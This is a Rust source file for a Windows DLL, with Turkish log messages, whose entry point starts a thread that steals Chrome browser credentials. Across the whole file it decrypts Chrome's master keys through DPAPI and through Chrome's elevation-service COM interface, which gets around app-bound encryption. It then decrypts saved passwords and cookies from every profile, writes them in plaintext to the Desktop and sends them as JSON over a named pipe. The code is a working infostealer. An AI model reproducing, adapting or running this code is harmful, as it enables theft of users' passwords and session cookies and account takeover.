use serde::{Deserialize, Serialize};
use serde_json::Value;
use std::fs;
use std::io::Write;
use std::path::{Path, PathBuf};
use std::ptr;
use std::thread;
use std::time::{SystemTime, UNIX_EPOCH};

#[derive(Serialize, Deserialize, Debug)]
struct PasswordData {
    url: String,
    username: String,
    password: String,
}

#[derive(Serialize, Deserialize, Debug)]
struct CookieData {
    host: String,
    name: String,
    value: String,
}

#[derive(Serialize, Deserialize, Debug)]
struct ProfileData {
    name: String,
    passwords: Vec<PasswordData>,
    cookies: Vec<CookieData>,
}
use winapi::{
    shared::{
        guiddef::GUID,
        minwindef::UINT,
        wtypes::BSTR,
        wtypesbase::CLSCTX_LOCAL_SERVER,
    },
    um::{
        combaseapi::{CoCreateInstance, CoInitializeEx, CoSetProxyBlanket},
        objbase::COINIT_APARTMENTTHREADED,
        oleauto::{SysAllocStringByteLen, SysFreeString, SysStringByteLen},
        winnt::DLL_PROCESS_ATTACH,
        dpapi::CryptUnprotectData,
        wincrypt::DATA_BLOB,
    },
    ctypes::c_void,
};

use aes_gcm::{
    aead::{Aead, KeyInit},
    Aes256Gcm, Nonce,
};

// Chrome 144+ için CLSID
const CLSID_ELEVATOR: GUID = GUID {
    Data1: 0x708860E0,
    Data2: 0xF641,
    Data3: 0x4611,
    Data4: [0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B],
};

const IID_IELEVATOR2: GUID = GUID {
    Data1: 0x1BF5208B,
    Data2: 0x295F,
    Data3: 0x4992,
    Data4: [0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38],
};

#[repr(C)]
struct IElevatorVTbl {
    QueryInterface: unsafe extern "system" fn(*mut c_void, *const GUID, *mut *mut c_void) -> i32,
    AddRef: unsafe extern "system" fn(*mut c_void) -> u32,
    Release: unsafe extern "system" fn(*mut c_void) -> u32,
    RunRecoveryCRXElevated: unsafe extern "system" fn(*mut c_void, *const u16, *const u16, *const u16, u32, *mut u32) -> i32,
    EncryptData: unsafe extern "system" fn(*mut c_void, u32, BSTR, *mut BSTR, *mut u32) -> i32,
    DecryptData: unsafe extern "system" fn(*mut c_void, BSTR, *mut BSTR, *mut u32) -> i32,
}

fn log_message(msg: &str) -> Result<(), std::io::Error> {
    let desktop = std::env::var("USERPROFILE")
        .map(|p| PathBuf::from(p).join("Desktop").join("log.txt"))
        .map_err(|e| std::io::Error::new(std::io::ErrorKind::Other, e))?;

    let timestamp = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs();

    let mut file = fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(desktop)?;

    writeln!(file, "[{}] {}", timestamp, msg)?;
    Ok(())
}

fn decrypt_dpapi(data: &[u8]) -> Result<Vec<u8>, String> {
    unsafe {
        let mut input = DATA_BLOB {
            cbData: data.len() as u32,
            pbData: data.as_ptr() as *mut u8,
        };
        let mut output = DATA_BLOB {
            cbData: 0,
            pbData: ptr::null_mut(),
        };

        if CryptUnprotectData(&mut input, ptr::null_mut(), ptr::null_mut(), ptr::null_mut(), ptr::null_mut(), 0, &mut output) != 0 {
            let result = std::slice::from_raw_parts(output.pbData, output.cbData as usize).to_vec();
            winapi::um::winbase::LocalFree(output.pbData as *mut c_void);
            Ok(result)
        } else {
            Err(format!("CryptUnprotectData failed: {}", winapi::um::errhandlingapi::GetLastError()))
        }
    }
}

fn decrypt_with_elevator(encrypted_blob: &[u8]) -> Result<Vec<u8>, String> {
    unsafe {
        let hr = CoInitializeEx(ptr::null_mut(), COINIT_APARTMENTTHREADED);
        let co_init = hr >= 0 || hr as u32 == 0x80010106;
        if !co_init {
            return Err(format!("CoInitializeEx başarısız: 0x{:08X}", hr as u32));
        }

        let result = (|| {
            let mut elevator_ptr: *mut c_void = ptr::null_mut();
            let hr = CoCreateInstance(&CLSID_ELEVATOR, ptr::null_mut(), CLSCTX_LOCAL_SERVER, &IID_IELEVATOR2, &mut elevator_ptr);

            if hr < 0 {
                return Err(format!("CoCreateInstance başarısız: 0x{:08X}", hr as u32));
            }

            let hr_blanket = CoSetProxyBlanket(elevator_ptr as *mut winapi::um::unknwnbase::IUnknown, 10, 0, ptr::null_mut(), 6, 3, ptr::null_mut(), 0x40);
            if hr_blanket < 0 {
                let _ = log_message(&format!("CoSetProxyBlanket başarısız: 0x{:08X}", hr_blanket as u32));
            }

            let bstr_encrypted = SysAllocStringByteLen(encrypted_blob.as_ptr() as *const i8, encrypted_blob.len() as UINT);
            if bstr_encrypted.is_null() {
                let vtable = *(elevator_ptr as *const *const IElevatorVTbl);
                ((*vtable).Release)(elevator_ptr);
                return Err("SysAllocStringByteLen başarısız".to_string());
            }

            let mut bstr_decrypted: BSTR = ptr::null_mut();
            let mut last_error: u32 = 0;
            let vtable = *(elevator_ptr as *const *const IElevatorVTbl);
            let hr = ((*vtable).DecryptData)(elevator_ptr, bstr_encrypted, &mut bstr_decrypted, &mut last_error);

            SysFreeString(bstr_encrypted);

            if hr < 0 {
                ((*vtable).Release)(elevator_ptr);
                return Err(format!("DecryptData başarısız: 0x{:08X}, last_error: {}", hr as u32, last_error));
            }

            let byte_len = SysStringByteLen(bstr_decrypted) as usize;
            let decrypted = std::slice::from_raw_parts(bstr_decrypted as *const u8, byte_len).to_vec();
            SysFreeString(bstr_decrypted);
            ((*vtable).Release)(elevator_ptr);

            Ok(decrypted)
        })();

        if hr >= 0 {
            winapi::um::combaseapi::CoUninitialize();
        }
        result
    }
}

fn aes_gcm_decrypt(key: &[u8], data: &[u8]) -> Result<Vec<u8>, String> {
    if data.len() < 15 { return Err("Data too short".to_string()); }
    let nonce = Nonce::from_slice(&data[3..15]);
    let ciphertext = &data[15..];
    let cipher = Aes256Gcm::new_from_slice(key).map_err(|e| e.to_string())?;
    cipher.decrypt(nonce, ciphertext).map_err(|e| e.to_string())
}

fn do_work() -> Result<(), Box<dyn std::error::Error>> {
    unsafe { winapi::um::debugapi::OutputDebugStringA(b"do_work started\0".as_ptr() as *const i8); }
    let _ = log_message("İşlem başlatıldı...");
    let user_profile = match std::env::var("USERPROFILE") {
        Ok(p) => p,
        Err(_) => {
            unsafe { winapi::um::debugapi::OutputDebugStringA(b"USERPROFILE not found\0".as_ptr() as *const i8); }
            return Ok(());
        }
    };
    let chrome_data_path = Path::new(&user_profile).join("AppData\\Local\\Google\\Chrome\\User Data");
    let desktop_db_path = Path::new(&user_profile).join("Desktop\\chrome_db");

    let _ = fs::create_dir_all(&desktop_db_path);

    let local_state_path = chrome_data_path.join("Local State");
    if !local_state_path.exists() {
        unsafe { winapi::um::debugapi::OutputDebugStringA(b"Local State not found\0".as_ptr() as *const i8); }
        let _ = log_message("Local State bulunamadı");
    }

    let (v10_key, v20_key) = (|| -> (Vec<u8>, Vec<u8>) {
        let content = match fs::read_to_string(&local_state_path) {
            Ok(c) => c,
            Err(_) => return (Vec::new(), Vec::new()),
        };
        let json: Value = match serde_json::from_str(&content) {
            Ok(j) => j,
            Err(_) => return (Vec::new(), Vec::new()),
        };

        let mut master_keys_file = fs::File::create(desktop_db_path.join("master_keys.txt")).ok();

        // v10 Key Extraction
        // v10 Key Extraction
        let mut v10_key = Vec::new();
        if let Some(os_crypt) = json.get("os_crypt") {
            if let Some(key_b64) = os_crypt.get("encrypted_key").and_then(|v| v.as_str()) {
                use base64::engine::Engine as _;
                if let Ok(encrypted_key) = base64::engine::general_purpose::STANDARD.decode(key_b64) {
                    if encrypted_key.starts_with(b"DPAPI") {
                        if let Ok(k) = decrypt_dpapi(&encrypted_key[5..]) {
                            v10_key = k;
                            if let Some(ref mut f) = master_keys_file {
                                let _ = writeln!(f, "v10 Master Key (hex): {}", v10_key.iter().map(|b| format!("{:02x}", b)).collect::<String>());
                            }
                            let _ = log_message("v10 Master Key başarıyla çıkarıldı.");
                        }
                    }
                }
            }
        }

        // v20 Key Extraction (App-Bound)
        let mut v20_key = Vec::new();
        let key_b64 = json.get("app_bound_encrypted_key").and_then(|v| v.as_str())
            .or_else(|| json.get("os_crypt").and_then(|oc| oc.get("app_bound_encrypted_key")).and_then(|v| v.as_str()));

        if let Some(b64) = key_b64 {
            use base64::engine::Engine as _;
            if let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(b64) {
                let blob = if decoded.starts_with(b"APPB") { &decoded[4..] } else { &decoded };
                match decrypt_with_elevator(blob) {
                    Ok(k) => {
                        v20_key = k;
                        if let Some(ref mut f) = master_keys_file {
                            let _ = writeln!(f, "v20 Master Key (hex): {}", v20_key.iter().map(|b| format!("{:02x}", b)).collect::<String>());
                        }
                        let _ = log_message("v20 Master Key başarıyla çıkarıldı.");
                    }
                    Err(e) => { let _ = log_message(&format!("v20 Key Hatası: {}", e)); }
                }
            }
        }
        (v10_key, v20_key)
    })();

    let mut profiles = vec!["Default".to_string()];
    if let Ok(entries) = fs::read_dir(&chrome_data_path) {
        for entry in entries.flatten() {
            let name = entry.file_name().to_string_lossy().to_string();
            if name.starts_with("Profile ") {
                profiles.push(name);
            }
        }
    }
    profiles.sort_by_key(|s| if s == "Default" { 0 } else { s[8..].parse::<u32>().unwrap_or(999) });
    let _ = log_message(&format!("Bulunan profil sayısı: {}", profiles.len()));

    let mut collected_profiles = Vec::new();

    for profile in profiles {
        let profile_path = chrome_data_path.join(&profile);
        let profile_output_path = desktop_db_path.join(&profile);
        fs::create_dir_all(&profile_output_path)?;

        let mut results_file = fs::File::create(profile_output_path.join("decrypted_data.txt"))?;
        let _ = writeln!(results_file, "=== Profil: {} ===", profile);

        let mut profile_data = ProfileData {
            name: profile.clone(),
            passwords: Vec::new(),
            cookies: Vec::new(),
        };

        // Passwords Extraction
        let login_db = profile_path.join("Login Data");
        if login_db.exists() {
            let temp_db = profile_output_path.join("Login_Data.tmp");
            if fs::copy(&login_db, &temp_db).is_ok() {
                if let Ok(conn) = rusqlite::Connection::open(&temp_db) {
                    if let Ok(mut stmt) = conn.prepare("SELECT origin_url, username_value, password_value FROM logins") {
                        let rows = stmt.query_map([], |row| Ok((row.get::<_, String>(0)?, row.get::<_, String>(1)?, row.get::<_, Vec<u8>>(2)?)));
                        if let Ok(rows) = rows {
                            let _ = writeln!(results_file, "\n--- Şifreler ---");
                            for row in rows.flatten() {
                                let (url, user, blob) = row;
                                if blob.len() > 15 {
                                    let key = if blob.starts_with(b"v20") { &v20_key } else { &v10_key };
                                    if !key.is_empty() {
                                        let dec = aes_gcm_decrypt(key, &blob).unwrap_or_else(|_| b"[Decryption Failed]".to_vec());
                                        let pass_str = String::from_utf8_lossy(&dec).to_string();
                                        let _ = writeln!(results_file, "URL: {}\nUser: {}\nPass: {}\n", url, user, pass_str);
                                        profile_data.passwords.push(PasswordData {
                                            url,
                                            username: user,
                                            password: pass_str,
                                        });
                                    }
                                }
                            }
                        }
                    }
                }
                let _ = fs::remove_file(temp_db);
            }
        }

        // Cookies Extraction
        let cookie_db = profile_path.join("Network\\Cookies");
        if cookie_db.exists() {
            let temp_db = profile_output_path.join("Cookies.tmp");
            if fs::copy(&cookie_db, &temp_db).is_ok() {
                if let Ok(conn) = rusqlite::Connection::open(&temp_db) {
                    if let Ok(mut stmt) = conn.prepare("SELECT host_key, name, encrypted_value FROM cookies") {
                        let rows = stmt.query_map([], |row| Ok((row.get::<_, String>(0)?, row.get::<_, String>(1)?, row.get::<_, Vec<u8>>(2)?)));
                        if let Ok(rows) = rows {
                            let _ = writeln!(results_file, "\n--- Çerezler (Cookies) ---");
                            for row in rows.flatten() {
                                let (host, name, blob) = row;
                                if blob.len() > 15 {
                                    let is_v20 = blob.starts_with(b"v20");
                                    let key = if is_v20 { &v20_key } else { &v10_key };
                                    if !key.is_empty() {
                                        if let Ok(dec) = aes_gcm_decrypt(key, &blob) {
                                            let val = if is_v20 && dec.len() > 32 { &dec[32..] } else { &dec[..] };
                                            let val_str = String::from_utf8_lossy(val).to_string();
                                            let _ = writeln!(results_file, "Host: {} | Name: {} | Value: {}", host, name, val_str);
                                            profile_data.cookies.push(CookieData {
                                                host,
                                                name,
                                                value: val_str,
                                            });
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
                let _ = fs::remove_file(temp_db);
            }
        }
        collected_profiles.push(profile_data);
    }

    // Send data over Named Pipe
    unsafe {
        winapi::um::debugapi::OutputDebugStringA(b"connecting to pipe\0".as_ptr() as *const i8);
        use std::os::windows::ffi::OsStrExt;
        let pipe_name: Vec<u16> = std::ffi::OsStr::new(r"\\.\pipe\chrome_extractor").encode_wide().chain(Some(0)).collect();

        let mut pipe_handle = winapi::um::handleapi::INVALID_HANDLE_VALUE;
        for i in 0..30 {
            pipe_handle = winapi::um::fileapi::CreateFileW(
                pipe_name.as_ptr(),
                winapi::um::winnt::GENERIC_WRITE,
                0,
                ptr::null_mut(),
                winapi::um::fileapi::OPEN_EXISTING,
                0,
                ptr::null_mut(),
            );
            if pipe_handle != winapi::um::handleapi::INVALID_HANDLE_VALUE {
                winapi::um::debugapi::OutputDebugStringA(b"connected to pipe\0".as_ptr() as *const i8);
                break;
            }
            if i % 5 == 0 {
                let msg = format!("waiting for pipe (att {}), last error: {}\0", i, winapi::um::errhandlingapi::GetLastError());
                winapi::um::debugapi::OutputDebugStringA(msg.as_ptr() as *const i8);
            }
            std::thread::sleep(std::time::Duration::from_millis(200));
        }

        if pipe_handle != winapi::um::handleapi::INVALID_HANDLE_VALUE {
            if let Ok(serialized) = serde_json::to_vec(&collected_profiles) {
                let mut bytes_written: u32 = 0;
                winapi::um::fileapi::WriteFile(
                    pipe_handle,
                    serialized.as_ptr() as *const _,
                    serialized.len() as u32,
                    &mut bytes_written,
                    ptr::null_mut(),
                );
                let msg = format!("sent {} bytes over pipe\0", serialized.len());
                winapi::um::debugapi::OutputDebugStringA(msg.as_ptr() as *const i8);
            }
            winapi::um::handleapi::CloseHandle(pipe_handle);
            let _ = log_message("Profil verileri Named Pipe üzerinden gönderildi.");
        } else {
            let msg = format!("could not connect to pipe: {}\0", winapi::um::errhandlingapi::GetLastError());
            winapi::um::debugapi::OutputDebugStringA(msg.as_ptr() as *const i8);
            let _ = log_message(&format!("Named Pipe'a bağlanılamadı: {}", winapi::um::errhandlingapi::GetLastError()));
        }
    }
    let _ = log_message("İşlem başarıyla tamamlandı.");
    Ok(())
}

#[no_mangle]
pub extern "system" fn DllMain(_hinst: *mut std::ffi::c_void, fdw_reason: u32, _lpv_reserved: *mut std::ffi::c_void) -> i32 {
    if fdw_reason == DLL_PROCESS_ATTACH {
        thread::spawn(|| {
            if let Err(e) = do_work() {
                let _ = log_message(&format!("HATA: {}", e));
            }
        });
    }
    1
}